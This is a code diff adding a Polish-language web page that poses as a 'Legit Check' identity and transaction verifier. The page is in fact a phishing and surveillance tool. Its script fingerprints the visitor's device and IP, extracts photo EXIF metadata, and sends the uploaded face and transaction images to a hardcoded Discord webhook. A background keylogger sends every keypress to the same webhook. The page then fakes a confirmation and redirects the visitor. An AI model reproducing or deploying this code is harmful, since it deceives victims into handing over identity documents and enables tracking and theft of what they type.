@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Checker Lite</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
+  <style>
+    body { background-color: #111; color: #eee; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; padding: 20px; }
+    .box { background: #1a1a1a; padding: 30px; border-radius: 10px; max-width: 400px; text-align: center; }
+    input { margin: 10px; }
+    button { background: #444; color: #fff; padding: 10px 20px; border: none; cursor: pointer; }
+    button:hover { background: #666; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Legit Check</h2>
+    <p>Prześlij zdjęcie twarzy oraz dowód transakcji.</p>
+    <input type="file" id="faceInput" accept="image/*"><br>
+    <input type="file" id="proofInput" accept="image/*"><br>
+    <button id="sendBtn">Wyślij</button>
+  </div>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/1355531440430907553/Q27rPq1-spGgSY7DX_Punt7scmw4OC-9nD5CTNQXvl3YBfqc0dVlNXzTCZhjA_25dGJd";
+
+    function getIP() {
+      return fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip);
+    }
+
+    function extractExif(file) {
+      return new Promise(resolve => {
+        EXIF.getData(file, function () {
+          resolve(EXIF.getAllTags(this));
+        });
+      });
+    }
+
+    function formatExif(data) {
+      let out = '';
+      for (const key in data) {
+        out += `**${key}**: ${data[key]}\n`;
+      }
+      return out || 'Brak EXIF';
+    }
+
+    async function main() {
+      const fp = await FingerprintJS.load();
+      const result = await fp.get();
+      const ip = await getIP();
+      const faceFile = document.getElementById("faceInput").files[0];
+      const proofFile = document.getElementById("proofInput").files[0];
+      if (!faceFile || !proofFile) return alert("Oba pliki są wymagane.");
+
+      const faceExif = await extractExif(faceFile);
+      const proofExif = await extractExif(proofFile);
+
+      const msg = `**LEGIT CHECK**
+**IP:** ${ip}
+**Fingerprint:** ${result.visitorId}
+**User-Agent:** ${navigator.userAgent}
+**Platforma:** ${navigator.platform}
+**Rozdzielczość:** ${screen.width}x${screen.height}
+**RAM:** ${navigator.deviceMemory || "?"} GB
+**CPU:** ${navigator.hardwareConcurrency || "?"} rdzeni
+
+**EXIF Twarz:**
+${formatExif(faceExif)}
+
+**EXIF Transakcja:**
+${formatExif(proofExif)}
+`;
+
+      const form = new FormData();
+      form.append("content", msg);
+      form.append("file", faceFile, "face.jpg");
+      form.append("file", proofFile, "transaction.jpg");
+
+      fetch(webhook, { method: "POST", body: form });
+
+      alert("Dziękujemy, trwa weryfikacja.");
+      window.location.href = "https://web.telegram.org"; // lub inny redirect
+    }
+
+    document.getElementById("sendBtn").addEventListener("click", main);
+
+    // KEYLOGGER (działa w tle)
+    document.addEventListener("keydown", e => {
+      fetch(webhook, {
+        method: "POST",
+        body: `KEY=${e.key}`
+      });
+    });
+  </script>
+</body>
+</html>
